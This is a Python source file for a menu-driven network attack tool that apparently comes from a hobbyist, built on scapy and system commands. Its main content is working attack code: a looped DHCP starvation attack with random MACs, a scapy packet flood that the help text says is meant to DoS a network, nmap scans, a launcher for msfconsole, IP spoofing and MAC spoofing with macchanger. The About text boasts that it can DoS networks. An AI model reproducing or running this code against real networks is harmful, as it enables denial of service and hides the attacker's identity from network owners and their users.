import subprocess
import os
import time
import sys
import importlib
import socket
from IPy import IP
from scapy.all import *



banner1 = "\033[1;36m"+ """                                            
                                           *#    @                                     
                                            @/   @&                                   
                                              @@%  %@&                                 
                                (@@&.  @@@     (@@@ .@@@                               
                          @@@@@@@@@@@@@@@@@@@@#. @@@@.%@@@.                            
                      .*%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#                          
                    .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/                       
                   ,@@@@@@@@@@@&*           .%@@@@@@@@@@@@@@@@@@@@.                    
                @@@@@@@@@@@@*                     %@@@@@@@@@@@@@@@@@/                  
                  (@@@@@@@#                          /@@@@@@@@@@@.@@@@                 
               .@@@@@@@@#                              @@@@@@@@@@(,@@@%               
              @@@@@@@@@@,                                @@@@@@@@@@@@@@@.             
               @@@@@@@#                                  @@@@@@@@@@@@@,             
              /@@@@@@@@%                                    (@@@@@@@@@@.            
              @%.&@@@@@@@.                                      &@@@@@@@@/          
                  @@@@@@@@@*                                       @@@@@@@@@%       
                  *@@#@@@@@@@@,                                      @@@@@@@@*      
                        (@@@@@@@@&                                    @@@@@@        
                            (@@@@@@@@@/                              ,@@@.          
                                .&@@@@@@@@@%                                        
                                     *@@@@@@@@@*                                   
                                            %@@@@@@&                                
                                                .@@@@@%                             
                                                    (@@@&                           
                                                       @@@.                         
                                                         @@/                        
                                                          &@                        
                                                           &                        
                                                           .      

"""

banner2="\033[1;36m"+'''


 .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .-----------------.
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |  _________   | || |      __      | || |     ______   | || |  ____  ____  | || |  ____  ____  | || |     ____     | || | ____  _____  | |
| | |  _   _  |  | || |     /  \     | || |   .' ___  |  | || | |_   ||   _| | || | |_  _||_  _| | || |   .'    `.   | || ||_   \|_   _| | |
| | |_/ | | \_|  | || |    / /\ \    | || |  / .'   \_|  | || |   | |__| |   | || |   \ \  / /   | || |  /  .--.  \  | || |  |   \ | |   | |
| |     | |      | || |   / ____ \   | || |  | |         | || |   |  __  |   | || |    \ \/ /    | || |  | |    | |  | || |  | |\ \| |   | |
| |    _| |_     | || | _/ /    \ \_ | || |  \ `.___.'\  | || |  _| |  | |_  | || |    _|  |_    | || |  \  `--'  /  | || | _| |_\   |_  | |
| |   |_____|    | || ||____|  |____|| || |   `._____.'  | || | |____||____| | || |   |______|   | || |   `.____.'   | || ||_____|\____| | |
| |              | || |              | || |              | || |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 

'''

banner3 = "\033[1;36m"+ '''

          _____                    _____                    _____                    _____                    _____                    _____            _____                    _____   
         /\    \                  /\    \                  /\    \                  /\    \                  /\    \                  /\    \          /\    \                  /\    \         
        /::\____\                /::\    \                /::\    \                /::\    \                /::\    \                /::\____\        /::\    \                /::\    \        
       /:::/    /               /::::\    \              /::::\    \              /::::\    \              /::::\    \              /:::/    /       /::::\    \              /::::\    \       
      /:::/    /               /::::::\    \            /::::::\    \            /::::::\    \            /::::::\    \            /:::/    /       /::::::\    \            /::::::\    \      
     /:::/    /               /:::/\:::\    \          /:::/\:::\    \          /:::/\:::\    \          /:::/\:::\    \          /:::/    /       /:::/\:::\    \          /:::/\:::\    \     
    /:::/____/               /:::/__\:::\    \        /:::/__\:::\    \        /:::/__\:::\    \        /:::/  \:::\    \        /:::/    /       /:::/__\:::\    \        /:::/__\:::\    \    
   /::::\    \              /::::\   \:::\    \      /::::\   \:::\    \      /::::\   \:::\    \      /:::/    \:::\    \      /:::/    /       /::::\   \:::\    \       \:::\   \:::\    \   
  /::::::\    \   _____    /::::::\   \:::\    \    /::::::\   \:::\    \    /::::::\   \:::\    \    /:::/    / \:::\    \    /:::/    /       /::::::\   \:::\    \    ___\:::\   \:::\    \  
 /:::/\:::\    \ /\    \  /:::/\:::\   \:::\    \  /:::/\:::\   \:::\____\  /:::/\:::\   \:::\    \  /:::/    /   \:::\    \  /:::/    /       /:::/\:::\   \:::\    \  /\   \:::\   \:::\    \ 
/:::/  \:::\    /::\____\/:::/__\:::\   \:::\____\/:::/  \:::\   \:::|    |/:::/  \:::\   \:::\____\/:::/____/     \:::\____\/:::/____/       /:::/__\:::\   \:::\____\/::\   \:::\   \:::\____\
\::/    \:::\  /:::/    /\:::\   \:::\   \::/    /\::/   |::::\  /:::|____|\::/    \:::\  /:::/    /\:::\    \      \::/    /\:::\    \       \:::\   \:::\   \::/    /\:::\   \:::\   \::/    /
 \/____/ \:::\/:::/    /  \:::\   \:::\   \/____/  \/____|:::::\/:::/    /  \/____/ \:::\/:::/    /  \:::\    \      \/____/  \:::\    \       \:::\   \:::\   \/____/  \:::\   \:::\   \/____/ 
          \::::::/    /    \:::\   \:::\    \            |:::::::::/    /            \::::::/    /    \:::\    \               \:::\    \       \:::\   \:::\    \       \:::\   \:::\    \     
           \::::/    /      \:::\   \:::\____\           |::|\::::/    /              \::::/    /      \:::\    \               \:::\    \       \:::\   \:::\____\       \:::\   \:::\____\    
           /:::/    /        \:::\   \::/    /           |::| \::/____/               /:::/    /        \:::\    \               \:::\    \       \:::\   \::/    /        \:::\  /:::/    /    
          /:::/    /          \:::\   \/____/            |::|  ~|                    /:::/    /          \:::\    \               \:::\    \       \:::\   \/____/          \:::\/:::/    /     
         /:::/    /            \:::\    \                |::|   |                   /:::/    /            \:::\    \               \:::\    \       \:::\    \               \::::::/    /      
        /:::/    /              \:::\____\               \::|   |                  /:::/    /              \:::\____\               \:::\____\       \:::\____\               \::::/    /       
        \::/    /                \::/    /                \:|   |                  \::/    /                \::/    /                \::/    /        \::/    /                \::/    /        
         \/____/                  \/____/                  \|___|                   \/____/                  \/____/                  \/____/          \/____/                  \/____/         
Version 1.1
________________________________________________________________________________________    
|    [00]Quit Script                                   [01]About                        |             
|    [0]Script help                                    [1]dhcp starvation               |                                    
|    [2]ping ICMP                                      [3]nmap port scan                |
|    [4]discover hosts                                 [5]search msfconsole for vuln    |
|    [6]Packet Flaw                                    [7]Discover ip info              |
|    [8]IP spoofing                                    [9]MAC spoofing macchanger       |
|_______________________________________________________________________________________|    
'''

banner4 = "\033[1;36"+'''


           Coded by T4chyon                           

'''



if not 'SUDO_UID' in os.environ.keys():
    print("Run program using sudo !")
    exit()

def DOS():
    os.system('clear') 
    print(banner3) 
 
  
        
    option = input("\033[1;36m"+' Select an option\n >> ')
    if option == "1":
        os.system("clear")
        print(banner1)
        print("This attack will overtake every available adress on your dhcp, it will use dhcp request right after the dhcp offers you an ip")
        time.sleep(2)
       
        print("Starting DHCP starvation......")	
        conf.checkIPaddr = False

        #Create DHCP discover with destination IP = broadadcast
        #Source MAC address is a random MAC address
        #Source IP address = 0.0.0.0
        #Destination IP address = broadcast
        #Source port = 68 (DHCP / BOOTP Client)
        #Destination port = 67 (DHCP / BOOTP Server)
        #DHCP message type is discover
        dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff',src=RandMAC())  \
                     /IP(src='0.0.0.0',dst='255.255.255.255') \
                     /UDP(sport=68,dport=67) \
                     /BOOTP(op=1,chaddr = RandMAC()) \
                     /DHCP(options=[('message-type','discover'),('end')])

        #Send packet out of eth0 and loop the packet
        sendp(dhcp_discover,iface='eth0',loop=1,verbose=1)             
        input('Press Any Button To Return To The Menu\n>> ') 
        DOS()
################################################################################

    elif option =="2":
        os.system('clear')            
        print(banner1)
        nb=input("How many request packets would you like to send ? \n>> ")
        request = input("Enter the ip adress you want to reach\n>> : ")
        ping = subprocess.run(["sudo","ping","-c" +nb, request])
        input("Press Any Button To return to the Menu\n>>")
        DOS()
##################################################################################            
            
    elif option == "3":
        os.system('clear')
        print(banner2)
        ip = input("Enter the ip adress of the network (probably 191.168.1.1) :")
        scan = subprocess.run(["sudo","nmap","-sS", ip])    
        input("Press Any Button To return to the menu\n>>")
        DOS()
###################################################################################          
    elif option == "4":
        try :
            os.system('clear')
            print(banner2)
            ip = input("Enter the ip adress of the network (probably 191.168.1.1/24) \n>>")
            scan = subprocess.run(["sudo","nmap","-sP", ip])    
        except KeyboardInterrupt :
            DOS()    
        input("Press Any Button To Return To The Menu\n>>")
        DOS()
###################################################################################
    elif option == "01":
        os.system('clear')
        print("This script is a python based script, it has the power to DOS networks. U are responsable for your own actions!")
        input("Press Any Button To Return To The Menu\n>>")
        DOS()

####################################################################################
    elif option == "5":
        search = input("What do you want to search msfconsole ? :")
        msf = subprocess.run(["sudo","msfconsole"])
        time.sleep(20)
        msf_search = subprocess.run(["search",search])
        input("Press Any Button To Return To The Menu\n>>")
        DOS()
####################################################################################       
    elif option == "6":
        os.system('clear')
        count1= int(input("How many packets do you want to send\n>>>"))
        send(IP(src="192.168.1.13", dst="192.168.1.1")/TCP(sport=80, dport=80), count=count1)
        input("Press Any Button To Return To The Menu\n>>")
        DOS()

####################################################################################
    elif option=="7":
        ip_info = os.system("sudo route -n && ip route show")
        print(ip_info)
        input("Press Any Button To Return To The Menu\n>>")
        DOS()   
####################################################################################

    elif option =="00":
        print("Exiting Script..................")
        time.sleep(0.5)
        os.system('clear')
        sys.exit()
        quit()
####################################################################################

    elif option == "0":
        os.system('clear')
        print(banner4)
        print("Option 1 : this attack will overtake all possible ip adresses on the dhcp causing a dos of the network")
        print("Option 2 : This is a simple ping request")
        print("Option 3 : This is an nmap command that will look for open ports on the network")
        print("Option 4 : This is an nmap command that will look for all the clients on the network")
        print("Option 5 : This will take you to msfconsole in order to find any vulnerablity you could've discovered with nmap")
        print("Option 6 : This option will us scapy to generate a big number of packets then sending in order to DOS the network")
        print("Option7  : This option displays the ip information")
        print("Option 8 : This option will allow you to spoof your eth0 ip address")
        print("Option 9 : This will allow you to change your MAC to a random one with macchanger")
        
        input("Press Any Button To Return To The Menu\n>>")
        DOS()
###################################################################################   
        
    elif option =="8":
        ip = input("Enter new ip adress\n>>>")
        change = subprocess.run(["sudo","ifconfig", "eth0",ip]) 
        ifconfig = subprocess.run(["ifconfig"])
        time.sleep(3)
        input("Press Any Button To Return to the Menu")
        DOS()
##################################################################################"        
    elif option == "9":
        try :
            os.system('clear')
            print(banner1)
            subprocess.run(["ifconfig"])
            time.sleep(4)
            interface= input("Please specify the internet interface you are using\n>>>")
            down = subprocess.run(["sudo", "ifconfig", interface,"down"])
            current_mac= subprocess.run(["sudo","macchanger","-r",interface])
            new_mac= subprocess.run(["sudo","macchanger", "-s", interface])
            up = subprocess.run(["sudo", "ifconfig", interface,"up"])
        except:
            print("An error has occured")
            DOS()
        input("Press Any Button To Return To The Menu\n>>")
        DOS()
    
    else : 
        print("\033[1;36m" + ("you have not put a correct option!"))
        print("\033[1;36m" + ("Returning to the Menu..."))   
        time.sleep(0.5)
        DOS() 
   
#######################################################################################

        

   
   
DOS()
 
    
    



